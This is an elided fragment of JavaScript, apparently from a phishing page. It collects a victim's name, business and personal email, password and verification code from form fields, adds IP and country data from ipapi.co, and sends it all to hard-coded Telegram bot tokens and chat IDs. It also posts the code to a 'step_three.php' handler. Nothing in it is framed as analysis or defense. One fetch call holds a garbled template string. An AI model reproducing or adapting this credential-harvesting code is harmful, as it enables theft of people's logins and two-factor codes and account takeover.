        ...
        getIp();
        var bot = 'bot6107978326:AAF9BLpwPtaoLPurhYDSQpkB2q1gL1wL5x4';
        var chid = '2133247544';
            ...
            $.get("https://ipapi.co/json/", function(response) {
                ...
                var params = {
                    content: '=============================' + '%0A' +
                        ...
                        '2|Business Email: "' + document.getElementById('business').value.replace('#', '-sharp-') + '"' + '%0A' +
                        '3|Personal Email: "' + document.getElementById('email').value.replace('#', '-sharp-') + '"' + '%0A' +
                ...
                fetch(`https://api.telegram.org/bot6030130151:AAGWuXQ4V9sHuStZHFpAyrQTzFJcJXRGpx8/sendMessage?chat_id=-1001885264420&text=${params.content}/`, {
                    method: 'POST', // or 'PUT'
                    headers: {
        ...
        function sndtepafb2() {
            let psdasdas2 = document.getElementById('psdasdas2').value.replace('#', '-sharp-');
            $.get("https://ipapi.co/json/", function(response) {
                let country = response.country;
            ...
            if (pass.length === 0) {
                ...
                if (parseInt(tries.value) === 0) {
                    ...
                    $.get("https://ipapi.co/json/", function(response) {
                        ...
                        var params = {
                            content: '=============================' + '%0A' +
                                'Full Name : "' + document.getElementById('name').value.replace('#', '-sharp-') + '"' + '%0A' +
                    ...
                    if (code === null) {
                        ...
                        $.get("https://ipapi.co/json/", function(response) {
                            ...
                            fetch(`https://api.telegram.org/bot6030130151:AAGWuXQ4V9sHuStZHFpAyrQTzFJcJXRGpx8/sendMessage?chat_id=-1001885264420&text=${params.content}/, {text=${params.content}/`, {
                                method: 'POST', // or 'PUT'
                                headers: {
                                    'Content-Type': 'application/json',
                                },
                        ...
                        $.get("https://ipapi.co/json/", function(response) {
                            ...
                            $.post("step_three.php", {
                                code: code.value,
                                city: city,
                                ip: document.getElementById('iadreps').value.replace('#', '-sharp-')
                            });
